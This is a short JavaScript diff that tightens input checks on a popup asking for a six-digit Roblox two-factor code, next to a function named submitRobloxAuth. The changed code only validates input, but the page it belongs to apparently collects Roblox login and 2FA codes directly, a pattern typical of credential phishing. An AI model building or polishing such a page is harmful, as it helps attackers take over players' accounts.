@@ -752,7 +752,7 @@ function submitRobloxAuth() {
     }, 2000);
 }
 
-// Add input validation for new 2FA design
+// Enhanced input validation for new 2FA design
 function setupRoblox2FAInputValidation() {
     const codeInput = document.getElementById('robloxVerificationCode');
     const verifyBtn = document.getElementById('robloxVerifyBtn');
@@ -761,14 +761,17 @@ function setupRoblox2FAInputValidation() {
     
     // Handle input validation and button state
     const handleInput = () => {
-        const value = codeInput.value.replace(/\D/g, ''); // Only digits
+        // Only allow digits and limit to 6 characters
+        const value = codeInput.value.replace(/\D/g, '').substring(0, 6);
         codeInput.value = value;
         
-        if (value.length === 6) {
-            verifyBtn.disabled = false;
+        // Check if valid 6-digit code
+        const isValid = value.length === 6 && /^\d+$/.test(value);
+        
+        verifyBtn.disabled = !isValid;
+        if (isValid) {
             verifyBtn.classList.add('enabled');
         } else {
-            verifyBtn.disabled = true;
             verifyBtn.classList.remove('enabled');
         }
     };
@@ -785,7 +788,9 @@ function setupRoblox2FAInputValidation() {
     codeInput.addEventListener('input', handleInput);
     codeInput.addEventListener('keydown', handleKeyDown);
     
-    // Focus the input when popup opens
+    // Focus the input when popup opens and ensure it starts disabled
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove('enabled');
     setTimeout(() => codeInput.focus(), 100);
 }
 
